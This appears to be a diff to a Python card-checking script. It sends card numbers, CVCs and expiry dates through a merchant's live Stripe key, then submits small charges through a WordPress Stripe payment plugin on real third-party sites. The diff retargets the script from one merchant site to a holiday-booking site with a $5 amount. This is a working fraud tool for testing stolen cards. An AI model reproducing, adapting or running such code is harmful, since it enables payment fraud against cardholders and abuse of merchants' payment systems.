@@ -32,7 +32,13 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
     }
 
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&key=pk_live_uT03yHr43ixBThj3iKLY7HLz'
+    data = (
+        f'type=card&card[number]={n}&card[cvc]={cvc}'
+        f'&card[exp_month]={mm}&card[exp_year]={yy}'
+        f'&guid=NA&muid=NA&sid=NA'
+        f'&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element'
+        f'&key=pk_live_51QhDDVHWPpZcisLuMwjv1ViU8uCO57CpVHEkbM1kqmtEjJeIqjpaWdkV1v1aJIZzTsfQrSwP87AbhnkJLjXzF3yS00YCnP2Wym'
+    )
 
     response = requests.post(
         'https://api.stripe.com/v1/payment_methods',
@@ -43,38 +49,35 @@ def Tele(ccx):
     pm = response.json()['id']
 
     headers = {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'Origin': 'https://spinalogic.org',
-        'Referer': 'https://spinalogic.org/register-card/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-        'X-Requested-With': 'XMLHttpRequest',
+        'authority': 'www.benidormholidays.com',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://www.benidormholidays.com',
+        'referer': 'https://www.benidormholidays.com/payments/',
         'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
     }
 
     data = {
         'action': 'wp_full_stripe_inline_payment_charge',
-        'wpfs-form-name': 'CardCaptureInline',
+        'wpfs-form-name': 'MakeAPayment',
         'wpfs-form-get-parameters': '%7B%7D',
-        'wpfs-custom-input[]': [
-            'Min Thant',
-            'Street 2',
-            'Min Thant',
-        ],
+        'wpfs-custom-amount-unique': '5',
+        'wpfs-custom-input[]': 'Super ',
         'wpfs-card-holder-email': 'minthantshin.virus11@gmail.com',
-        'wpfs-card-holder-name': 'Min Thant',
+        'wpfs-card-holder-name': 'Super Z',
         'wpfs-stripe-payment-method-id': f'{pm}',
     }
 
     response = requests.post(
-        'https://spinalogic.org/wp-admin/admin-ajax.php',
+        'https://www.benidormholidays.com/wp-admin/admin-ajax.php',
         headers=headers,
         data=data
     )
